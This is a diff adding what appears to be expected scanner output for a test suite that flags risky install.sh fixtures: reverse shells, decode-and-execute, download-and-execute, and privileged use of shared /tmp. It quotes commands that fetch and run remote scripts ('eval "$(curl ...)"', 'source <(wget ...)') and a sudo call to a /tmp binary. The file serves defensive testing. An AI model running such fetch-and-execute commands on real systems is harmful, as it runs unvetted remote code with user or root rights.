@@ -1,0 +1,13 @@
+finding oma.script.decode-execute high decode-execute/install.sh 2 decode-execute
+finding oma.script.download-execute high download-execute-nopipe/install.sh 2 download-execute
+finding oma.script.download-execute high download-execute-nopipe/install.sh 3 download-execute
+finding oma.script.privileged-shared-temp-controlled high privileged-shared-temp-controlled/install.sh 2 shared-temp-mode-release
+finding oma.script.reverse-shell high reverse-shell/install.sh 2 reverse-shell
+finding oma.script.reverse-shell high reverse-shell/install.sh 3 reverse-shell
+finding oma.script.privileged-shared-temp low privileged-shared-temp/install.sh 2 privileged-shared-temp
+capability network-access shell benign-scripts/install.sh 8 - wget -q https://example.test/wallpaper.jpg -O "$HOME/Pictures/wallpaper.jpg"
+capability network-access shell download-execute-nopipe/install.sh 2 - eval "$(curl -fsSL https://example.test/omarchy-h3/setup.sh)"
+capability network-access shell download-execute-nopipe/install.sh 3 - source <(wget -qO- https://example.test/omarchy-h3/env.sh)
+capability process-execution shell benign-scripts/install.sh 5 - sudo pacman -S --noconfirm omarchy-theme
+capability process-execution shell privileged-shared-temp/install.sh 2 - sudo /tmp/omarchy-helper --install
+fingerprint dd5673c14d9a0a76d2919b420c750140ac218400ad8cd61161f6f664ca7e06bf
